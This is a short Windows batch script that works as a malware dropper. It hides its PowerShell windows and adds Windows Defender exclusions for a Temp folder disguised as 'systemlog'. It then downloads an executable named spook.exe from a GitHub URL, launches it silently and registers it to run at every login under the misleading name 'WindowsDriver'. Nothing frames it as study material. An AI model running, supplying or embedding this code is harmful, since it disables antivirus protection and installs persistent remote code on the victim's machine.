if not exist "C:\Windows\Temp\systemlog" mkdir "C:\Windows\Temp\systemlog"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\Windows\Temp\systemlog'" >nul 2>&1

timeout /t 2 >nul

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\Users\%USERNAME%\AppData\Local\Temp'" >nul 2>&1

timeout /t 3 >nul

set "URL=https://github.com/0x421/asd/raw/refs/heads/main/spook.exe"
set "DEST=C:\Windows\Temp\systemlog\spook.exe"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'" >nul 2>&1

timeout /t 1 >nul

start "" /B "%DEST%"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDriver" /t REG_SZ /d "\"C:\Windows\Temp\systemlog\spook.exe" -silent" /f >nul 2>&1
pause
